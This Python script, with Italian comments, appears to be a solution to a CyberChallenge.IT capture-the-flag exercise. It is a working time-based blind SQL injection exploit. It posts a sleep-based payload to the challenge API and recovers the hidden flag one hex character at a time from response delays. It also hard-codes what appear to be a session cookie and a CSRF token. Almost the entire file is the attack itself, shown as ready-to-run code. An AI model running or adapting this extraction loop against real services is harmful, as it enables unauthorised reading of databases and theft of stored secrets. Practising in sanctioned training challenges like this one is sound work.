import requests
import time

# URL del backend vulnerabile
url = "http://sqlinjection.challs.cyberchallenge.it/api/time"

# Payload SQL Injection
payload = "1' and (select sleep(2) from flags where HEX(flag) LIKE '{}%')='1"
cookies = {"session": "eyJjc3JmX3Rva2VuIjoiZDg2YTMyNmJkYzM2NmNjZDg1NGMzN2M4YzYyMWJmYTc0MmFkZTkwNCJ9.Z9Vjzw.-DnGdV2Ai_aEB-Awv5w4r5X0yOY"}
headers = {
    "Content-Type": "application/json",
    "X-CSRF-Token": "ImQ4NmEzMjZiZGMzNjZjY2Q4NTRjMzdjOGM2MjFiZmE3NDJhZGU5MDQi.Z9VxXA.B04TKb3VAXaIGAnTsqWjhxgs4q0",
    "X-requested-with": "XMLHttpRequest",
}


# Dizionario dei caratteri esadecimali
dictionary = "0123456789abcdef"
result = ""

# Funzione per fare la richiesta HTTP con il payload
def send_request(sql_payload):
    data_json =  {
        "query": sql_payload
    }

    response = requests.post(url, json=data_json, cookies=cookies, headers=headers)  # Cambia a GET se necessario
    print(response.text); 
    return response.text  # Oppure response.json() se l'output è JSON

# Estrarre il valore di `asecret` carattere per carattere
while True:
    found = False
    for c in dictionary:
        before_request = time.time()

        question = payload.format(result + c)
        response = send_request(question)

        total_time = time.time()-before_request 
        if total_time > 2: 
            result += c
            print(f"[+] Carattere trovato: {c} → {result}")
            found = True
            break

    if not found:
        print(f"[+] Valore estratto: {result}")
        break
